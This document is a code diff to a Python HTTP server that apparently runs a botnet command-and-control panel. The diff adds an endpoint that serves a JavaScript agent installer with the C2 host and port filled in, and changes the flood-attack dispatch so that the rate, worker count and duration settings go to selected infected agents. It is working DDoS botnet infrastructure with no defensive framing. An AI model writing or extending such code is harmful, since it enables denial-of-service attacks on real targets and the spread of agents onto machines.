@@ -68,6 +68,7 @@ _results      = []   # list of result dicts (last 200)
 AGENT_TEMPLATE    = os.path.join(HERE, "agent", "agent_template.py")
 INSTALL_SH        = os.path.join(HERE, "agent", "install_template.sh")
 INSTALL_PS1       = os.path.join(HERE, "agent", "install_template.ps1")
+INSTALL_JS        = os.path.join(HERE, "agent", "install_template.js")
 
 # ── Shared SSE / flood state ──────────────────────────────────────────────────
 _lock         = threading.Lock()
@@ -317,6 +318,33 @@ class Handler(BaseHTTPRequestHandler):
                 self._json({"results": list(_results)})
             return
 
+        # ── Universal JS installer ────────────────────────────────────────────
+        if path == "/install.js":
+            qs     = parsed.query
+            params = {}
+            for part in qs.split("&"):
+                if "=" in part:
+                    k, v = part.split("=", 1)
+                    params[k] = v
+            c2_host = params.get("host", "").strip()
+            c2_port = params.get("port", str(PORT)).strip()
+            try:
+                with open(INSTALL_JS, "r") as f:
+                    src = f.read()
+            except Exception as e:
+                self._json({"ok": False, "error": str(e)})
+                return
+            if c2_host:
+                src = src.replace("__C2_HOST__", c2_host).replace("__C2_PORT__", c2_port)
+            data_out = src.encode()
+            self.send_response(200)
+            self._cors()
+            self.send_header("Content-Type",   "application/javascript; charset=utf-8")
+            self.send_header("Content-Length", str(len(data_out)))
+            self.end_headers()
+            self._safe_write(data_out)
+            return
+
         # ── Installer scripts ─────────────────────────────────────────────────
         if path in ("/install.sh", "/install.ps1"):
             qs     = parsed.query
@@ -407,8 +435,9 @@ class Handler(BaseHTTPRequestHandler):
             workers     = max(1,   int(data.get("workers", 50)))
             rps         = max(0.1, float(data.get("rps", 100)))
             duration    = max(1.0, float(data.get("duration", 30)))
-            local_flood = bool(data.get("local", True))   # run flood on this server
-            bot_dispatch = bool(data.get("bots", True))   # dispatch to agents
+            local_flood    = bool(data.get("local", True))    # run flood on this server
+            bot_dispatch   = bool(data.get("bots", True))     # dispatch to agents
+            selected_agents = data.get("agent_ids", None)     # None = all, list = specific IDs
 
             if not target:
                 self._json({"ok": False, "error": "target is required"})
@@ -420,7 +449,7 @@ class Handler(BaseHTTPRequestHandler):
                 self._json({"ok": False, "error": "invalid method"})
                 return
 
-            # Dispatch task to all connected agents
+            # Dispatch task to selected (or all) agents
             dispatched = 0
             if bot_dispatch:
                 task_id = "{:.0f}".format(time.time())
@@ -433,9 +462,14 @@ class Handler(BaseHTTPRequestHandler):
                     "duration": duration,
                 }
                 with _bots_lock:
-                    agent_ids = list(_bots.keys())
+                    all_ids = list(_bots.keys())
+                # Filter to selected agents if provided, else use all
+                if selected_agents and isinstance(selected_agents, list):
+                    target_ids = [aid for aid in selected_agents if aid in all_ids]
+                else:
+                    target_ids = all_ids
                 with _tasks_lock:
-                    for aid in agent_ids:
+                    for aid in target_ids:
                         _tasks[aid] = dict(task_payload)
                         dispatched += 1
                 if dispatched:
